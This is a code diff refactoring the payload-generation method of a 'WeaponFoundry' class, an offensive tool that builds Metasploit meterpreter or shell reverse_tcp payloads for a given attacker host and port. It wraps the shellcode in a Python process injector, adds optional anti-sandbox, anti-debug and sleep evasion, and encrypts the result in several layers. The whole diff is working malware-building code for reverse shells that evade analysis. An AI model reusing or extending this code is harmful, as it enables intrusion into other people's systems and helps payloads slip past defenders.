@@ -783,6 +783,38 @@ class WeaponFoundry:
 
         logger.info("Weapon Foundry initialized")
 
+    def _generate_msf_payload(
+        self,
+        shell_type: ShellType,
+        lhost: str,
+        lport: int,
+        format: PayloadFormat,
+    ) -> str:
+        """Generate payload using Metasploit if available."""
+        if not MetasploitIntegrator.is_available():
+            return ""
+
+        msf_payload = (
+            "meterpreter/reverse_tcp"
+            if shell_type == ShellType.REVERSE_TCP
+            else "shell/reverse_tcp"
+        )
+        arch = "x64"
+        platform = (
+            "windows"
+            if format in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA]
+            else "linux"
+        )
+
+        raw_bytes = self.msf_integrator.generate_payload(
+            platform, arch, msf_payload, lhost, lport, "raw",
+        )
+
+        if raw_bytes and format == PayloadFormat.PYTHON:
+            base = self.templates.get_process_injector_python(shellcode_var="_sc")
+            return f"_sc={raw_bytes!s}\n{base}"
+        return ""
+
     def forge(
         self,
         shell_type: ShellType = ShellType.REVERSE_TCP,
@@ -794,68 +826,22 @@ class WeaponFoundry:
         anti_sandbox: bool = False,
         anti_debug: bool = False,
         sleep_seconds: int = 0,
-        use_msf: bool = False,  # New: Request Metasploit Payload
+        use_msf: bool = False,
     ) -> GeneratedPayload:
         """Forge a new payload with specified parameters."""
+        # 1. Try Metasploit generation if requested
         base_payload = ""
+        if use_msf:
+            base_payload = self._generate_msf_payload(shell_type, lhost, lport, format)
 
-        # 1. Metasploit "God Mode" Generation (If requested & available)
-        if use_msf and MetasploitIntegrator.is_available():
-            # Map ShellType to MSF Payload
-            msf_payload = (
-                "meterpreter/reverse_tcp"
-                if shell_type == ShellType.REVERSE_TCP
-                else "shell/reverse_tcp"
-            )
-            arch = "x64"  # Defaulting to x64 for modern
-            platform = (
-                "windows"
-                if format
-                in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA]
-                else "linux"
-            )  # Simplification
-
-            raw_bytes = self.msf_integrator.generate_payload(
-                platform,
-                arch,
-                msf_payload,
-                lhost,
-                lport,
-                "raw",
-            )
-
-            if raw_bytes:
-                # If we got raw bytes, we need to wrap them in our loader (Python/PS1)
-                # This injects MSF shellcode into our Custom Loader
-                if format == PayloadFormat.PYTHON:
-                    # Inject into Python Process Injector template
-                    base_payload = self.templates.get_process_injector_python(
-                        shellcode_var="_sc",
-                    )
-                    # We need to prepend the bytes definition, but since forge() encrypts the whole string,
-                    # we must pass the CODE as string.
-                    # Wait, our encryption encrypts the STRING content of the script.
-                    # So we construct the valid source code now.
-                    sc_repr = str(raw_bytes)
-                    base_payload = f"_sc={sc_repr}\n{base_payload}"
-                elif format == PayloadFormat.RAW:
-                    # Just return the bytes, but we need str for encryption loop below unless we refactor
-                    # Refactoring for Raw bytes handling in Forge is complex.
-                    # For now, we only support MSF -> Wrapped Format (Python/PS1)
-                    pass
-
-        # 2. Native Fallback (If MSF failed or not requested)
+        # 2. Native Fallback
         if not base_payload:
             base_payload = self._generate_base_payload(shell_type, lhost, lport, format)
 
         # Add anti-analysis if requested
         if anti_sandbox or anti_debug or sleep_seconds > 0:
             base_payload = self._add_anti_analysis(
-                base_payload,
-                format,
-                anti_sandbox,
-                anti_debug,
-                sleep_seconds,
+                base_payload, format, anti_sandbox, anti_debug, sleep_seconds,
             )
 
         # Encrypt payload
@@ -864,13 +850,9 @@ class WeaponFoundry:
         iv = None
 
         for _ in range(iterations):
-            payload_bytes, key, iv = self.encryption.encrypt(
-                payload_bytes,
-                encryption,
-                key,
-            )
+            payload_bytes, key, iv = self.encryption.encrypt(payload_bytes, encryption, key)
 
-        # Prepend IV to payload if exists (Standard for block ciphers like AES)
+        # Prepend IV to payload if exists
         if iv:
             payload_bytes = iv + payload_bytes
             logger.debug("Encryption IV prepended to payload: %s", iv.hex())
